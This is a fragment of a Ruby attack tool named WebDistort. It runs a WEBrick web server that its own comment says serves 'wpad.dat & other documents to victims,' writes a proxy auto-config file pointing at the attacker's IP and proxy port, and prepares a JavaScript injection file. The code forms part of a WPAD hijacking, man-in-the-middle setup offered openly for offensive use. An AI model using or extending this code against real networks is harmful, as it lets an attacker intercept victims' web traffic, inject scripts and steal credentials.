#!/usr/bin/ruby
#

# define external libraries
require "rubygems"
require "dnsruby"
require "optparse"
require "socket"
require "webrick"
require "webrick/httpproxy"
require "webrick/httputils"
require "pp"

class WebDistort

	class HTTP
    @server_ip = ''
    
    @proxy_port = ''

    @http_root = ''   
    @http_port = ''

    @header_file = nil
    @data_dir = Dir::pwd + '/saved'
    
    @options = nil
    
    def initialize(o)
      @options = o
            
      @data_dir = @options['data_dir']
      @http_root = @options['http_root']
      @http_port = @options['http_port']
      @proxy_port = @options['proxy_port']
      @server_ip = @options['server_ip']       
    end
    
=begin
	Start web server to serve wpad.dat & other documents to victims.
=end
def start()
  http_logger = WEBrick::Log.new(@data_dir + "/http.log")
  access_log_file = File.open(@data_dir + "/http_access.log", "a")
  access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
  
	system_mime_table = WEBrick::HTTPUtils::DefaultMimeTypes
	user_mime_table = system_mime_table.update(
		{ "dat" => "application/x-ns-proxy-autoconfig" })

	server = WEBrick::HTTPServer.new(
    :Logger => http_logger,
    :AccessLog => access_logger,
		:MimeTypes => user_mime_table,
		:Port => @http_port, 
		:DocumentRoot => @http_root)

  ['INT', 'TERM', 'KILL'].each {|signal|
    trap(signal) { server.shutdown ; access_log_file.close }
  }
	server.start
end

def setup_files()
      wpad_template_file = File.open(@http_root + "/wpad.dat.tpl", "r")
      wpad_data = wpad_template_file.read
      wpad_template_file.close

      wpad_file = File.open(@http_root + "/wpad.dat", "w")
      wpad_file.syswrite(wpad_data.gsub(/proxyIpAddr/, @server_ip).gsub(/proxyPort/, @proxy_port.to_s))
      wpad_file.close

      js_template_file = File.open(@http_root + "/inject.js.tpl", "r")
      js_data = js_template_file.read
      js_template_file.close

      js_file = File.open(@http_root + "/inject.js", "w")
      js_file.syswrite(js_data.gsub(/proxyIpAddr/, @server_ip).gsub(/httpPort/, @http_port.to_s))
      js_file.close
end


end
end

